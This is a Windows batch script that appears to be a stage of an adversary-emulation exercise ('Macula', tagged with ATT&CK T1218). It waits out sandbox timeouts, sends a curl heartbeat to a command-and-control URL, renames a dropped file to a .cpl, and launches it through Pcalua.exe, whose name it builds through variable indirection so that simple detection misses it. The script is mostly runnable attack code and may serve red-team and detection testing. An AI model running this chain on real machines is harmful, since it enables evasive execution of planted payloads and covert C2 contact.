@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ placeholder assignments (plain literals)
SET lkfsmx=%APPDATA%\8929\6a93ef38
SET qmnrfd=Macula-Stage0-8929
SET jhzrtp=https://10.0.0.49
SET nkwqwp=https://10.0.0.49/stage/2/icon.png?8929-7
SET vhqbqn=BALAM-S2BO
SET wqpmlp=7
SET szmgzq=teams.txt
SET tpzltd=8929

REM Set log file path
SET xqvntj=%APPDATA%\!wqpmlp!\macula-simulations.log

REM Initial delay (sandbox evasion)
timeout /t 15 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!vhqbqn!]: delay_complete=15s>> "!xqvntj!" 2>nul

REM C2 Heartbeat (non-obfuscated curl)
curl -k -s -o nul "!nkwqwp!"
echo [!DATE! !TIME!][DEBUG][!vhqbqn!]: heartbeat_sent=1>> "!xqvntj!" 2>nul

REM Random delay between operations
ping -n 8 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!vhqbqn!]: delay_complete=8s>> "!xqvntj!" 2>nul

REM Obfuscate Pcalua.exe using variable indirection
SET mhdkp=Pca
SET pqzxf=lua.
SET jkthn=exe
SET ybnxw=!mhdkp!!pqzxf!!jkthn!

REM Rename DLL to CPL (DLL already exists from Stage 0)
REN "!lkfsmx!\!szmgzq!" pcafile.cpl
IF ERRORLEVEL 1 (
    SET bzqknd=0
    SET htnjgd=file_not_found
) ELSE (
    SET bzqknd=1
    SET htnjgd=
)
echo [!DATE! !TIME!][!vhqbqn!]: !wqpmlp!-!tpzltd!-T1218|Signed_Binary_Proxy_Execution=!bzqknd!:!htnjgd!>> "!xqvntj!" 2>nul
echo [!DATE! !TIME!][DEBUG][!vhqbqn!]: file_rename=!bzqknd!>> "!xqvntj!" 2>nul

REM Random delay using variable
SET /A vhxprd=%RANDOM% %% 15 + 5
timeout /t !vhxprd! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!vhqbqn!]: random_delay=!vhxprd!s>> "!xqvntj!" 2>nul

REM Execute CPL via obfuscated Pcalua.exe using nested variable references
SET gzxrf=!lkfsmx!\pcafile.cpl
SET pdqhm=-a
SET vfmnj=!pdqhm! !gzxrf!
CALL SET cmdline=%%vfmnj%%
"!ybnxw!" !cmdline!
IF ERRORLEVEL 1 (
    SET qmwhpn=0
    SET lytrsn=execution_failed
) ELSE (
    SET qmwhpn=1
    SET lytrsn=
)
echo [!DATE! !TIME!][DEBUG][!vhqbqn!]: execution_complete=!qmwhpn!>> "!xqvntj!" 2>nul

REM Final delay
CHOICE /C Y /N /D Y /T 12 >nul
echo [!DATE! !TIME!][DEBUG][!vhqbqn!]: final_delay=12s>> "!xqvntj!" 2>nul